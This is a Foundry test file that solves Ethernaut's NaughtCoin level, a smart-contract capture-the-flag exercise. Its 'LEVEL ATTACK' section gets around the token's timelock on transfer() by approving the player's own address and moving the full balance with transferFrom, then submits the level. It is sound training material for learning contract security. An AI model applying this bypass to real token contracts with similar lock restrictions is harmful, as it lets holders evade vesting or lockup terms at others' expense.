pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../../src/15_NaughtCoin/NaughtCoinFactory.sol";
import "../../src/Ethernaut.sol";
import ".././utils/vm.sol";

contract NaughtCoinTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();

        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testNaughtCoinHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        NaughtCoinFactory probFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(probFactory);
        vm.startPrank(eoaAddress);

        address levelAddress = ethernaut.createLevelInstance(probFactory);
        NaughtCoin probCtrt = NaughtCoin(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        uint256 amount = probCtrt.balanceOf(eoaAddress);

        probCtrt.approve(eoaAddress, amount);
        probCtrt.transferFrom(eoaAddress, address(msg.sender), amount);
        // probCtrt.transferFrom(address(0), eoaAddress, amount);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
